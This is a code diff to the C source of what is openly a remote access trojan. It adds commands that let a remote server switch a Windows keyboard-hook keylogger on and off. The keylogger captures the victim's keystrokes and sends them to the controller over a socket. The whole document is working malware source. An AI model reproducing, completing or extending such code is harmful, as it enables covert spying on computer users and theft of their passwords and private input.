@@ -1,6 +1,7 @@
 #include "commands.h"
 #include "log.h"
 #include "net_util.h"
+
 #include <pthread.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -11,6 +12,7 @@
 
 SOCKET server;
 HHOOK hook;
+int keylog_on = 1;
 
 static SOCKET init_client() {
   AddrInfo *result, *ptr, hints;
@@ -48,7 +50,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
   p->op = RAT_PACKET_KEYLOG;
   p->data_len = RAT_KEYLOG_DATA_SIZE;
   LOG_DEBUG("chars %d", chars_in_cur_line);
-  if (server == INVALID_SOCKET) {
+  if (server == INVALID_SOCKET || !keylog_on) {
     PostQuitMessage(0);
   }
   if (nCode >= 0 && wParam == WM_KEYDOWN) {
@@ -105,6 +107,15 @@ int main() {
       goto exit;
     }
     switch (p->op) {
+    case RAT_PACKET_TURN_OFF:
+      keylog_on = 0;
+      break;
+    case RAT_PACKET_TURN_ON:
+      if (!keylog_on) {
+        keylog_on = 1;
+        pthread_create(&keylog_thread, NULL, keylog_handler, NULL);
+      }
+      break;
     case RAT_PACKET_ECHO:
       sentbytes = recv(server, (char *)p->data, p->data_len, 0);
       LOG_DEBUG("arrived echo packet with message: %s", p->data);
